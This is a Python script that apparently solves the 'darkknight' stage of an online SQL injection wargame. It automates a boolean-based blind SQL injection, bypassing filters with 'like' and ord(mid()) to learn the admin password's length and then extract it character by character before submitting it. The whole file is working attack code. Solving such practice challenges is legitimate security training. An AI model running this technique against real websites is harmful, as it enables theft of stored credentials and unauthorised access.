#!/usr/bin/env python3

'''
# Summary
- we can use ord() instead of ascii()
'''


import requests
import string

header = {"Cookie": "PHPSESSID=❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚;"}
url = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php"
string_data = string.digits + string.ascii_letters

print(string_data)

pw = ""
pw_len = 1

# find pw length
while True:
    data = "?no=1 or id like \"admin\" %26%26 length(pw) like {}%23".format(str(pw_len))
    response = requests.get(url + data, headers=header)
    if response.text.find("Hello admin") != -1:
        break
    print("[*] Finding... : " + str(pw_len))
    pw_len += 1
print("[+] Get pw Length : " + str(pw_len))

# find pw
for idx in range(1, pw_len + 1):
    for i in string_data:
        data = "?no=1 or id like \"admin\" %26%26 ord(mid(pw,{},1)) like {}%23".format(idx,ord(i))
        response = requests.get(url + data, headers=header)
        if response.text.find("Hello admin") != -1:
            pw = pw + i
            print("[*] Finding... : " + pw)
            break
print("[+] Found pw : " + pw)

payload = "?pw="+pw

response = requests.get(url + payload, headers=header)

result = response.text
if result.find("Clear!") != -1:
    end = result.split("Clear!")[0].split("<h2>")[1]
    if end.find("admin") != -1:
        end = result.split("Clear!")[0].split("<h2>")[2]
    print(end+"Clear!")